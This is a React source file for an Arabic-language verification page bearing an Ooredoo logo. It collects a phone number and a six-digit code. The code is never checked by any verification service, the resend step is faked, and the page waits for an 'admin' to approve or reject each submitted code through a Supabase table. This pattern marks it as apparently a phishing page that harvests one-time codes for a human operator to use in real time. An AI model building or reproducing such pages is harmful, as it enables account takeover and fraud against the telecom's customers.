import { useState, useRef, useEffect } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { toast } from "sonner";
import ooredooLogo from "@/assets/ooredoo-logo.webp";
import { ArrowRight, ShieldCheck } from "lucide-react";

const VerifyOtp = () => {
  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const [loading, setLoading] = useState(false);
  const [countdown, setCountdown] = useState(60);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const location = useLocation();
  const navigate = useNavigate();
  const phone = (location.state as { phone?: string })?.phone;

  useEffect(() => {
    if (!phone) {
      navigate("/login");
      return;
    }
    inputRefs.current[0]?.focus();
  }, [phone, navigate]);

  useEffect(() => {
    if (countdown <= 0) return;
    const timer = setInterval(() => setCountdown((c) => c - 1), 1000);
    return () => clearInterval(timer);
  }, [countdown]);

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newOtp = [...otp];
    newOtp[index] = value.slice(-1);
    setOtp(newOtp);
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
    const newOtp = [...otp];
    pasted.split("").forEach((char, i) => {
      newOtp[i] = char;
    });
    setOtp(newOtp);
    inputRefs.current[Math.min(pasted.length, 5)]?.focus();
  };

  const [waiting, setWaiting] = useState(false);

  const handleVerify = async () => {
    const code = otp.join("");
    if (code.length !== 6) {
      toast.error("يرجى إدخال رمز التحقق كاملاً");
      return;
    }
    setLoading(true);
    setWaiting(true);
    toast.info("بانتظار موافقة المسؤول...");
  };

  // Poll for admin approval/rejection
  useEffect(() => {
    if (!waiting || !phone) return;
    const code = otp.join("");
    
    const channel = supabase
      .channel("otp_status_check")
      .on("postgres_changes", {
        event: "UPDATE",
        schema: "public",
        table: "login_requests",
      }, (payload) => {
        const row = payload.new as { phone: string; otp_code: string; status: string };
        if (row.phone === phone && row.otp_code === code) {
          if (row.status === "approved") {
            toast.success("تمت الموافقة! جاري تسجيل الدخول...");
            navigate("/dashboard");
          } else if (row.status === "rejected") {
            toast.error("المعلومات المدخلة غير صحيحة");
            setWaiting(false);
            setLoading(false);
            setOtp(["", "", "", "", "", ""]);
            inputRefs.current[0]?.focus();
          }
        }
      })
      .subscribe();

    return () => { supabase.removeChannel(channel); };
  }, [waiting, phone, otp, navigate]);

  const handleResend = async () => {
    // Demo mode
    await new Promise((r) => setTimeout(r, 500));
    toast.success("تم إعادة إرسال الرمز (تجريبي)");
    setCountdown(60);
    setOtp(["", "", "", "", "", ""]);
    inputRefs.current[0]?.focus();
  };

  return (
    <div className="min-h-screen flex flex-col bg-background" dir="rtl">
      {/* Top gradient section */}
      <div className="relative bg-primary pt-8 pb-20 px-4 rounded-b-[3rem] overflow-hidden">
        <div className="absolute top-[-60px] right-[-40px] w-48 h-48 rounded-full bg-primary-foreground/5" />
        <div className="absolute bottom-[-30px] left-[-20px] w-32 h-32 rounded-full bg-primary-foreground/5" />

        <div className="relative z-10 max-w-sm mx-auto">
          <button
            onClick={() => navigate("/login")}
            className="flex items-center gap-2 text-primary-foreground/70 hover:text-primary-foreground transition-colors mb-6"
          >
            <ArrowRight className="h-5 w-5" />
            <span className="text-sm font-medium">رجوع</span>
          </button>

          <div className="flex flex-col items-center space-y-3">
            <div className="w-16 h-16 rounded-2xl bg-primary-foreground/10 backdrop-blur-sm flex items-center justify-center border border-primary-foreground/10">
              <ShieldCheck className="h-8 w-8 text-primary-foreground" />
            </div>
            <h1 className="text-xl font-extrabold text-primary-foreground">رمز التحقق</h1>
            <p className="text-primary-foreground/70 text-center text-sm leading-relaxed">
              تم إرسال رمز مكون من 6 أرقام إلى
              <br />
              <span className="text-primary-foreground font-semibold" dir="ltr">{phone}</span>
            </p>
          </div>
        </div>
      </div>

      {/* OTP Card */}
      <div className="flex-1 px-4 -mt-10">
        <div className="w-full max-w-sm mx-auto space-y-6">
          <div className="glass-card rounded-2xl p-6 shadow-xl space-y-6">
            {/* OTP Inputs */}
            <div className="flex gap-3 justify-center" dir="ltr">
              {otp.map((digit, i) => (
                <input
                  key={i}
                  ref={(el) => (inputRefs.current[i] = el)}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleChange(i, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(i, e)}
                  onPaste={i === 0 ? handlePaste : undefined}
                  className="w-12 h-14 text-center text-xl font-bold rounded-xl border-2 border-input bg-muted/50 text-foreground focus:border-primary focus:ring-2 focus:ring-ring/20 focus:bg-card outline-none transition-all"
                />
              ))}
            </div>

            {/* Verify Button */}
            <Button
              onClick={handleVerify}
              className="w-full h-12 text-base font-bold rounded-xl shadow-md hover:shadow-lg transition-all"
              disabled={loading || otp.join("").length !== 6}
            >
              {loading ? (
                <span className="animate-pulse-soft">{waiting ? "بانتظار الموافقة..." : "جاري التحقق..."}</span>
              ) : (
                "تأكيد"
              )}
            </Button>
          </div>

          {/* Resend */}
          <div className="text-center">
            {countdown > 0 ? (
              <p className="text-sm text-muted-foreground">
                إعادة الإرسال خلال{" "}
                <span className="text-primary font-bold text-base">{countdown}</span>{" "}
                ثانية
              </p>
            ) : (
              <button
                onClick={handleResend}
                className="text-sm text-primary font-semibold hover:underline"
              >
                إعادة إرسال الرمز
              </button>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

export default VerifyOtp;
